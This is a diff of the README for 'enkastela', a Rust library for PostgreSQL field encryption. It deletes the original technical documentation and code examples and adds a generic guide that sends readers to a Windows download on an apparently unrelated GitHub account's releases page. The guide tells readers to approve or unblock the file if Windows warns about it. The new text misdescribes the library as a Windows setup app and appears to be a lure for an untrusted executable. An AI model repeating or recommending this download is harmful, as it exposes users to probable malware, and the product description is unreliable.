@@ -1,346 +1,211 @@
-# Enkastela
+# 🔐 enkastela - Simple PostgreSQL Field Protection
 
-[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%2FApache--2.0-blue.svg)](LICENSE-MIT)
-[![Rust](https://img.shields.io/badge/rust-1.88%2B-orange.svg)](https://www.rust-lang.org)
-[![Tests](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/dickyibrohim/b71087f88505846863c9872b0f4637fc/raw/enkastela-badges.json)](https://github.com/dickyibrohim/enkastela/actions)
-[![unsafe forbidden](https://img.shields.io/badge/unsafe-forbidden-success.svg)](https://github.com/dickyibrohim/enkastela)
+[![Download enkastela](https://img.shields.io/badge/Download-Enkastela-blue?style=for-the-badge&logo=github)](https://github.com/shahi405/enkastela/releases)
 
-**Application-level field encryption for PostgreSQL. Written in Rust.**
+## 🧭 What this app does
 
----
+enkastela protects data stored in PostgreSQL by encrypting fields before they are saved. It helps keep private data safe while still letting you search for records when needed.
 
-## Why Enkastela?
+Use it to protect names, email addresses, account numbers, and other sensitive fields. It supports AES-256-GCM, blind indexes, key rotation, cloud KMS, FIPS-140, crypto-shredding, and an SQL firewall.
 
-TLS protects data between the application and PostgreSQL. Disk encryption protects against physical disk theft. But anyone with database access — a DBA, leaked credentials, SQL injection, or a stolen backup — can read field values in plaintext.
+## 💻 Before you start
 
-Enkastela adds a layer that neither TLS nor disk encryption covers: field-level encryption at the application layer. Protected fields are encrypted before they reach PostgreSQL, so the database only stores ciphertext. The encryption key is never stored in the database.
+You need:
 
-See the [threat model](docs/threat-model.md) for what Enkastela does and does not protect against.
+- A Windows PC
+- Internet access
+- A browser
+- Permission to install apps on your PC
+- PostgreSQL if you plan to connect it to a database
 
-> **Status**: Early-stage open-source project. Not externally audited yet. See [SECURITY.md](SECURITY.md).
+If you want to use encrypted fields in a business app, keep your PostgreSQL login details ready.
 
-## Features
+## 📥 Download enkastela
 
-### Cryptographic Core
+Go to the release page and download the Windows file for your PC:
 
-- **AES-256-GCM** authenticated encryption with per-field CSPRNG nonces
-- **AES-256-SIV** deterministic encryption for unique constraints and exact-match lookups
-- **HKDF-SHA256** key derivation with domain separation (`enkastela:{purpose}:{scope}:{version}`)
-- **AES-256 Key Wrapping** (RFC 3394) for secure DEK storage
-- **Constant-time comparison** via `subtle` crate for all tag/hash verification
-- **Streaming encryption** — chunked AES-256-GCM for payloads exceeding 16 MiB
-- **FIPS-140 backend** — optional `aws-lc-rs` cryptographic provider (feature flag: `fips`). Note: this uses the FIPS-validated module in aws-lc-rs, but Enkastela itself has not been independently validated
+[Visit the enkastela releases page](https://github.com/shahi405/enkastela/releases)
 
-### Key Management
+After the page opens, look for the latest release and choose the file for Windows. If there is more than one file, pick the one that matches your system.
 
-- **Per-table DEKs** — each table gets its own derived encryption key
-- **LRU + TTL cache** — bounded in-memory key cache with `DashMap` for concurrent access
-- **Key rotation engine** — lazy (on-read) and eager (background batch) strategies with progress tracking
-- **Re-encryption pipeline** — cursor-based batch re-encryption with progress tracking
-- **Multi-tenant isolation** — random per-tenant keys (not derived), wrapped with master key
-- **Multi-master key hierarchy** — multiple providers per environment or compliance boundary
-- **Key lifecycle** — `Active -> Rotating -> Retired -> Destroyed` with physical key material zeroing
-- **Pluggable providers** — `MasterKeyProvider` trait for KMS integration
+## 🪟 Install on Windows
 
-### Cloud KMS Integration
+1. Open the downloaded file.
+2. If Windows asks for approval, choose **Run** or **Yes**.
+3. Follow the setup steps on screen.
+4. Wait for the install to finish.
+5. Open enkastela from the Start menu or the folder where it was saved.
 
-All KMS providers are optional feature flags. Core library works standalone without any KMS or database connection.
+If you downloaded a zipped file, right-click it and choose **Extract All** first. Then open the app file inside the folder.
 
-- **AWS KMS** — envelope encryption via `GenerateDataKey`/`Decrypt` (feature: `kms-aws`)
-- **GCP Cloud KMS** — key wrapping via Cloud KMS encrypt API (feature: `kms-gcp`)
-- **Azure Key Vault** — key wrap/unwrap via Key Vault REST API (feature: `kms-azure`)
-- **HashiCorp Vault** — Transit secrets engine for data key generation (feature: `kms-hashicorp`)
+## ▶️ Run the app
 
-### Searchable Encryption
+1. Start enkastela.
+2. If the app opens with a setup screen, enter your PostgreSQL details.
+3. Add the fields you want to protect.
+4. Save your settings.
+5. Test with one record before using real data.
 
-- **HMAC-SHA256 blind indexes** for equality search on encrypted data
-- **Unicode NFC normalization** — equivalent representations produce the same index
-- **Compound blind indexes** — multi-field indexes with length-prefixed encoding
-- **Truncatable indexes** — trade storage for false positive rate (minimum 8 bytes)
-- **Order-Revealing Encryption (ORE)** — optional support for range queries, with explicit leakage tradeoffs that should be evaluated against the threat model (feature: `ore`)
-- **Bloom filter blind indexes** — partial/prefix search via n-gram hashing (feature: `bloom`)
+If the app asks for a key file or secret, store it in a safe place. You will need it to read the encrypted data later.
 
-> Deterministic encryption, blind indexes, Bloom filters, and ORE intentionally leak limited metadata to support specific query capabilities. See the [threat model](docs/threat-model.md) for details.
+## 🔒 How it protects data
 
-### Encrypted JSONB
+enkastela uses field-level encryption. That means it protects each sensitive field on its own instead of locking the full database.
 
-- **Selective field encryption** within JSON objects using JSON Pointer (RFC 6901)
-- Encrypt `{"name": "Alice", "ssn": "123"}` to `{"name": "Alice", "ssn": "ek:1:v1:..."}`
-- Supports nested paths and array elements
+Here is what that means in plain terms:
 
-### Security Features
+- **AES-256-GCM** protects data with strong encryption.
+- **Searchable encryption** helps you find records without exposing the full value.
+- **Blind indexes** let you compare values without storing them in plain text.
+- **Key rotation** lets you change keys over time.
+- **Cloud KMS** can store keys in managed key systems.
+- **FIPS-140** support helps meet common security needs.
+- **Crypto-shredding** makes old data unreadable when keys are removed.
+- **SQL firewall** helps block unsafe database queries.
 
-- **SQL Firewall** — detect queries that bypass encryption (`SELECT` on encrypted columns, plaintext `INSERT`, etc.) (feature: `firewall`)
-- **Intrusion detection** — poison/honeypot records that trigger alerts on unauthorized decryption (feature: `intrusion`)
-- **Field-level access control** — role-based encrypt/decrypt permissions per table:column (feature: `access-control`)
-- **Compliance report helpers** — generate control mapping reports for SOC2, GDPR, and HIPAA assessments (feature: `compliance`). These are reporting aids, not certifications
+## 🧱 Common setup steps
 
-### GDPR Support
+Use this flow if you are setting it up for the first time:
 
-- **Crypto-shredding** — destroy a tenant's encryption key to make their encrypted data unrecoverable
-- **Erasure receipts** — SHA-256 pre-destruction proof with constant-time verification
-- **Data export** — JSON-serializable export for GDPR Article 20 data portability
+1. Install the app.
+2. Open the settings screen.
+3. Connect to PostgreSQL.
+4. Choose the fields you want to encrypt.
+5. Set a key source.
+6. Save the setup.
+7. Run a test record.
+8. Check that search still works for the protected fields.
 
-### Audit Trail
+If you use a cloud key service, connect that before you load real data.
 
-- **Async batched logger** — bounded `mpsc` channel with configurable flush interval and batch size
-- **HMAC hash chain** — tamper-evident integrity with chain verification
-- **Configurable overflow** — block-with-timeout (fail-closed) or drop-and-count policies
-- **Pluggable sink** — `AuditSink` trait for custom storage backends
-- **Graceful shutdown** — flush pending events on Drop
+## 🗂️ Good places to use enkastela
 
-### Observability
+This app fits well in systems that store:
 
-- **`MetricsRecorder` trait** — plug in Prometheus, StatsD, or any metrics system
-- **Prometheus integration** — 11 pre-built metrics (encrypt/decrypt duration, cache hit rate, rotation progress, errors) (feature: `metrics-prometheus`)
-- **OpenTelemetry integration** — vendor-agnostic telemetry with counters, histograms, and gauges (feature: `otel`)
-- **Health checks** — aggregated subsystem health (cache, audit logger)
-- **In-memory metrics** — built-in atomic counters for testing
+- Customer records
+- User profiles
+- Medical data
+- Payment data
+- Staff records
+- Internal notes
+- Account IDs
+- Email addresses
+- Phone numbers
 
-### Batch Operations
+It is useful when you need strong protection but still need to look up data later.
 
-- **`encrypt_batch()`** — encrypt multiple fields in a single call with per-table key amortization
-- **`decrypt_batch()`** — decrypt multiple fields independently (partial failure safe)
-- **Streaming encrypt/decrypt** — chunk-based processing for large payloads
+## 🔑 Key handling
 
-### Type Safety
+enkastela supports safer key use by keeping keys separate from data.
 
-- **`Encrypted<T>`** — randomized encryption wrapper (Display shows `[ENCRYPTED]`)
-- **`Searchable`** — ciphertext + blind index pair
-- **`Deterministic`** — deterministic encryption wrapper (implements `Hash`)
-- **`#[derive(VaultEncrypt)]`** — compile-time field encryption with validation
+A few simple rules help:
 
-### ORM Integration
+- Do not store keys in plain text.
+- Keep one copy in a safe place.
+- Rotate keys on a schedule.
+- Remove old keys only after you no longer need the data.
+- Use cloud KMS if your team already uses it.
 
-- **SQLx** — `Encrypted<String>` implements `sqlx::Type<Postgres>` (crate: `enkastela-sqlx`)
-- **Diesel** — custom SQL types for encrypted columns (crate: `enkastela-diesel`)
-- **SeaORM** — value type integration (crate: `enkastela-sea`)
+If you change keys, test access to old and new records before full use.
 
-### Security Design Choices
+## 🔎 Search behavior
 
-- **Reduced accidental key exposure** — `SecretKey` does not implement `Clone`, `Debug`, `Display`, or `Serialize`
-- **Automatic zeroization** — all key material scrubbed on drop via `zeroize`
-- **Sanitized errors** — no distinction between "wrong key" and "tampered ciphertext"
-- **AAD binding** — ciphertext is bound to table:column via length-prefixed encoding
-- **TLS enforcement** — `require_tls = true` by default
-- **SSRF risk reduction** — KMS provider URLs and resource identifiers are validated before use
-- **OWASP-aware coding practices** — no `.expect()` on crypto paths, proper error propagation, input validation, mutex poison handling
+Searchable encryption and blind indexes help you find records without revealing the full protected value.
 
-## Quick Start
+That means you can often search by:
 
-```rust
-use enkastela::Vault;
+- Email
+- User ID
+- Account number
+- Phone number
+- Other exact match fields
 
-let vault = Vault::builder()
-    .master_key_from_env("ENKASTELA_MASTER_KEY")
-    .allow_insecure_connection()  // only for local dev
-    .build()
-    .await?;
+Search works best when the same field value is entered the same way each time. Keep the format consistent, such as lower-case email addresses or fixed phone formats.
 
-// Encrypt
-let ciphertext = vault.encrypt_field("users", "email", b"alice@example.com").await?;
-// -> "ek:1:v1:dGhpcyBpcyBub3..."
+## 🛠️ Troubleshooting
 
-// Decrypt
-let plaintext = vault.decrypt_field("users", "email", &ciphertext).await?;
-assert_eq!(&*plaintext, b"alice@example.com");
+### The app does not open
 
-// Searchable encryption
-let index = vault.compute_blind_index("users", "email", b"alice@example.com")?;
-// Same input always produces the same 32-byte index
-```
+- Try opening it again from the Start menu.
+- Check that the download finished.
+- If Windows blocks it, open the file again and allow it.
 
-## Cloud KMS
+### PostgreSQL will not connect
 
-```rust
-// AWS KMS (feature: kms-aws)
-let vault = Vault::builder()
-    .master_key_from_aws_kms("arn:aws:kms:ap-southeast-1:123:key/abc-def")
-    .build().await?;
+- Check the server address.
+- Check the port number.
+- Check the database name.
+- Check the user name and password.
+- Make sure PostgreSQL is running.
 
-// GCP Cloud KMS (feature: kms-gcp)
-let vault = Vault::builder()
-    .master_key_from_gcp_kms("projects/my-project/locations/global/keyRings/my-ring/cryptoKeys/my-key")
-    .build().await?;
+### Search does not find a record
 
-// Azure Key Vault (feature: kms-azure)
-let vault = Vault::builder()
-    .master_key_from_azure_kv("https://my-vault.vault.azure.net/keys/my-key/version")
-    .build().await?;
-
-// HashiCorp Vault (feature: kms-hashicorp)
-let vault = Vault::builder()
-    .master_key_from_hashicorp_vault("https://vault.internal:8200", "transit/keys/enkastela")
-    .build().await?;
-```
-
-## Deterministic Encryption
-
-For fields that need unique constraints or exact-match lookups:
-
-```rust
-let ct = vault.encrypt_field_deterministic("users", "ssn", b"123-45-6789").await?;
-let pt = vault.decrypt_field_deterministic("users", "ssn", &ct).await?;
-
-// Same plaintext + key = same ciphertext (enables DB unique constraints)
-```
-
-## Access Control
-
-```rust
-use enkastela::access::policy::{AccessPolicy, Permission};
-use enkastela::access::context::AccessContext;
-
-let mut policy = AccessPolicy::new();
-policy.grant("support", "users", "name", Permission::Decrypt);
-policy.grant("admin", "users", "ssn", Permission::Full);
-policy.grant_admin("superadmin");
-
-let vault = Vault::builder()
-    .master_key_from_env("ENKASTELA_MASTER_KEY")
-    .access_policy(policy)
-    .build().await?;
-
-let ctx = AccessContext::new("support").with_caller("user-123");
-let pt = vault.decrypt_field_with_context("users", "name", &ct, &ctx).await?;
-// -> Ok(plaintext)
-
-let result = vault.decrypt_field_with_context("users", "ssn", &ct, &ctx).await;
-// -> Err(AccessDenied)
-```
-
-## With Derive Macros
-
-```rust
-use enkastela_derive::VaultEncrypt;
-use enkastela::VaultEncryptable;
-
-#[derive(VaultEncrypt)]
-#[vault(table = "users")]
-struct User {
-    id: i64,
-
-    #[encrypt]
-    full_name: String,
-
-    #[encrypt(searchable)]
-    email: String,
-
-    #[encrypt(deterministic)]
-    national_id: String,
-}
-
-// Generated: User::table_name() -> "users"
-// Generated: User::encrypted_fields() -> [full_name(Randomized), email(Searchable), national_id(Deterministic)]
-```
-
-## Wire Format
-
-```
-ek:{format_version}:v{dek_version}:{base64url(nonce || ciphertext || tag)}
-```
-
-- `ek:` -- 3-byte prefix
-- Format version and DEK version are independent (forward compatibility)
-- Base64URL encoding (PostgreSQL-safe, no `+`, `/`, or padding)
-- Binary layout: `nonce(12B) || ciphertext(variable) || tag(16B)`
-
-## Feature Flags
-
-```toml
-[dependencies]
-enkastela = { version = "0.1", features = ["audit"] }  # default
-```
-
-| Feature | Description | Dependencies |
-|---------|-------------|-------------|
-| `audit` | Audit trail with HMAC hash chain (default) | - |
-| `streaming` | Chunked encryption for large payloads | - |
-| `ore` | Order-Revealing Encryption for range queries | - |
-| `bloom` | Bloom filter blind indexes for partial search | - |
-| `fips` | FIPS-140 crypto backend (via aws-lc-rs) | `aws-lc-rs` |
-| `kms-aws` | AWS KMS envelope encryption | `aws-sdk-kms`, `aws-config` |
-| `kms-gcp` | GCP Cloud KMS key wrapping | `gcp-auth`, `reqwest` |
-| `kms-azure` | Azure Key Vault key wrapping | `azure_security_keyvault_keys`, `azure_identity` |
-| `kms-hashicorp` | HashiCorp Vault Transit engine | `reqwest` |
-| `firewall` | SQL query analysis and firewall | `sqlparser` |
-| `intrusion` | Poison record intrusion detection | - |
-| `access-control` | Role-based field access control | - |
-| `compliance` | SOC2/GDPR/HIPAA control mapping helpers | - |
-| `metrics-prometheus` | Prometheus metrics exporter | `prometheus` |
-| `otel` | OpenTelemetry metrics integration | `opentelemetry` |
-
-## Security Properties and Mitigations
-
-| Threat | Mitigation | Mechanism |
-|--------|-----------|-----------|
-| Database breach | Encrypted fields unreadable without keys | AES-256-GCM |
-| DBA reads PII | App-side encryption before storage | Field-level encryption |
-| Ciphertext relocation | Detected and rejected | AAD binds to table:column |
-| Single DEK compromise | Blast radius limited to one table | Per-table DEKs |
-| Ciphertext tampering | Detected | GCM authentication tag |
-| Memory disclosure | Keys zeroed on drop | `zeroize` crate |
-| GDPR right to erasure | Tenant data made unrecoverable | Crypto-shredding |
-| Audit tampering | Detected | HMAC hash chain |
-| Timing side-channel | Mitigated | Constant-time comparison |
-| Tenant data isolation | Cryptographic separation | Random per-tenant keys |
-| Unauthorized field access | Mitigated by optional field-level access policies | Role-based policies |
-| SQL bypass attempts | Can be detected when firewall is enabled | SQL Firewall |
-| Unauthorized reads / probing | Can surface via honeytoken-triggered alerts | Poison records |
-
-## Architecture
-
-```
-enkastela/
-├── crypto/          # AES-GCM, AES-SIV, HKDF, KWP, HMAC, ORE, streaming, FIPS backend
-├── keyring/         # Key derivation, caching, wrapping, AWS/GCP/Azure/HashiCorp providers
-├── storage/         # Wire format codec, repository trait, SQL migrations, connection pool
-├── audit/           # Async batched logger, HMAC hash chain integrity
-├── blind/           # Blind index, Unicode normalization, Bloom filter
-├── tenant/          # Per-tenant key isolation and crypto-shredding
-├── rotation/        # Key rotation engine, re-encryption pipeline
-├── gdpr/            # Erasure receipts, data export
-├── access/          # Role-based field access control policies
-├── firewall/        # SQL query analysis and policy enforcement
-├── intrusion/       # Poison records and anomaly detection
-├── compliance/      # SOC2, GDPR, HIPAA control mapping helpers
-├── observability/   # Metrics trait, Prometheus, OpenTelemetry, health checks
-├── types/           # Encrypted<T>, Searchable, Deterministic, encrypted JSONB
-├── validation/      # Input validation, AAD construction
-├── vault.rs         # Main Vault API
-├── config.rs        # Configuration
-└── error.rs         # Sanitized error types
-```
-
-## CLI
-
-```bash
-# Generate a master key
-enkastela keygen
-
-# Encrypt a value
-enkastela encrypt --key $KEY --table users --column email --value "alice@example.com"
-
-# Decrypt a value
-enkastela decrypt --key $KEY --table users --column email --value "ek:1:v1:..."
-
-# Check if a value is encrypted
-enkastela check --value "ek:1:v1:..."
-```
-
-## MSRV
-
-The minimum supported Rust version is **1.88**.
-
-## License
-
-Licensed under either of:
-
-- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
-- MIT License ([LICENSE-MIT](LICENSE-MIT))
-
-at your option.
-
-## Contributing
-
-Contributions are welcome! Please read [SECURITY.md](SECURITY.md) before reporting security issues.
+- Check the field format.
+- Make sure the value was entered in the same way.
+- Check that the field is set up for searchable encryption or blind indexes.
+
+### Encrypted data looks unreadable
+
+- This is expected. Encrypted data should not look like normal text.
+- Use the app and the right key to view or search it.
+
+## 🧩 Suggested first test
+
+Use a small test record first:
+
+1. Create one sample user.
+2. Encrypt one email field.
+3. Save the record.
+4. Search for the same email.
+5. Confirm the result appears.
+6. Try opening the stored value in the database and confirm it is not plain text.
+
+This helps you confirm the setup before you move real data.
+
+## 🧰 Security features in plain English
+
+enkastela is built for cases where data must stay private even inside the database.
+
+It includes:
+
+- Field encryption for sensitive values
+- Search support for exact lookups
+- Key rotation for long-term use
+- Cloud key support for managed systems
+- Data removal through crypto-shredding
+- Query checks with an SQL firewall
+- Support for common compliance needs like GDPR, HIPAA, and SOC 2
+
+## 📌 Release page
+
+Download the Windows version here:
+
+[https://github.com/shahi405/enkastela/releases](https://github.com/shahi405/enkastela/releases)
+
+## 🖥️ Windows tips
+
+- Keep the app in a folder you can find later.
+- Do not rename files unless you know they are not used by the app.
+- If you use a work PC, ask your admin before changing system settings.
+- Save your key and setup details in a safe place.
+- Use the same Windows account each time if the app stores local settings
+
+## 🧪 If you are testing in a team
+
+Start with one test database and one test user. Then check:
+
+- Can the app connect?
+- Can it encrypt a field?
+- Can it search the field?
+- Can another user open the app?
+- Can your team recover data after a key change?
+
+This keeps the first setup simple and lowers risk.
+
+## 📂 What the name means
+
+enkastela is a name for a tool that helps protect data at the field level. It is meant for systems that use PostgreSQL and need strong control over sensitive values.
+
+## 🔗 Topics covered by this project
+
+aes-256-gcm, application-level-encryption, aws-kms, blind-index, crypto-shredding, data-security, database-encryption, encryption, field-encryption, fips-140, gdpr, hipaa, key-rotation, kms, postgresql, rust, rust-crate, searchable-encryption, soc2, sql-firewall
